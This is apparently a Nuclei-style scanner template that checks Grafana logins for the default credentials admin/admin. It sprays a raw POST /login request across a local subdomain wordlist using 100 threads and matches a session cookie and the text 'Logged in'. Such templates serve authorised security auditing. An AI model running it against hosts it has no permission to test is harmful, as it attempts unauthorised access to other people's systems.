id: grafana-default-credential 2
info:
  author: pdteam
  name: Grafana Default Credentials Check
  severity: high
  tags: grafana,default-login
requests:
- attack: sniper
  matchers:
  - part: header
    type: word
    words:
    - grafana_session
  - part: body
    type: word
    words:
    - Logged in
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101
    Firefox/79.0

    Accept: application/json, text/plain, */*

    Accept-Language: en-US,en;q=0.5

    Referer: https://{{Subdomains}}

    content-type: application/json

    Connection: close


    {"user":"admin","password":"admin"}

    '
  threads: 100
